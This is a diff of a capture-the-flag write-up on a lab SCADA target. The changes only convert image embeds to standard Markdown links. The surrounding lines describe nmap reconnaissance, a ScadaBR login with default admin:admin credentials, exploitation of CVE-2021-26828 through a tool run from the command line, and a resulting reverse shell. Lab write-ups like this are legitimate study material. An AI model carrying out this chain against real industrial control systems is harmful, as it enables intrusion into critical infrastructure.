@@ -35,9 +35,9 @@ Recon -> ScadaBR (admin:admin) -> CVE-2021-26828 RCE -> reverse shell
 sudo nmap -sV -sC -p- 10.112.186.209 -oN scan.txt -vv
 ```
 
-![[nmap-scan-1.png]]
+![nmap scan 1](nmap-scan-1.png)
 
-![[nmap-scan-2.png]]
+![nmap-scan-2](nmap-scan-2.png)
 
 Key findings:
 
@@ -54,7 +54,7 @@ The interesting targets are 8080 (SCADA HMI) and 5020 (OT protocol).
 
 Browsing to `http://10.112.186.209:8080/ScadaBR/` presents the ScadaBR login panel.
 
-![[01-scadabr-login.png]]
+![ScadaBR login](01-scadabr-login.png)
 
 
 ---
@@ -69,7 +69,7 @@ After login, the interface exposes an `SQL` console and an `Import/Export` panel
 
 After login, the interface exposes an `SQL` console and an `Import/Export` panel, both of which are powerful post-auth surfaces.
 
-![[02-scadabr-dashboard.png]]
+![ScadaBR dashboard](02-scadabr-dashboard.png)
 
 A quick DB enumeration via the SQL console confirmed the underlying stack:
 
@@ -77,7 +77,7 @@ A quick DB enumeration via the SQL console confirmed the underlying stack:
 SELECT VERSION();
 ```
 
-![[03-scadabr-version.png]]
+![ScadaBR version](03-scadabr-version.png)
 
 This told us the ScadaBR app runs on an **Ubuntu 16.04 MariaDB** container, which is vulnerable to the ScadaBR authenticated file-upload RCE.
 
@@ -110,7 +110,7 @@ python3 scadaflare.py http://10.112.186.209:8080 admin admin \
 
 ScadaFlare handles the entire chain: login, payload generation, upload via `view_edit.shtm`, reverse shell trigger, and shell cleanup.
 
-![[04-scadaflare.png]]
+![ScadaFlare exploit](04-scadaflare.png)
 
 **Result:** reverse shell as `tomcat7`.
 
@@ -123,9 +123,9 @@ tomcat7@77f992b1ebf5:/var/lib/tomcat7/webapps/ScadaBR/resources$
 
 At this point we have RCE, but that is not the objective. The flag is not in the container. We confirm this with a targeted search:
 
-![[05-Shell-1.png]]
+![Shell-1](05-shell-1.png)
 
-![[06-shell-2.png]]
+![shell-2](06-shell-2.png)
 
 The only hits are system artifacts and ScadaBR icon assets (`flag_red.png`, `flag_green.png`, etc.). There is no `flag.txt`, no `user.txt`, no `root.txt`. The reverse shell gave us **a foothold inside the SCADA application container, not the flag**.
 
@@ -186,7 +186,7 @@ print(flag)
 | 115     | s    |         |                |
 **Result:**
 
-![[07-Flag.png]]
+![Flag](07-Flag.png)
 #### Flag:
 
 ```
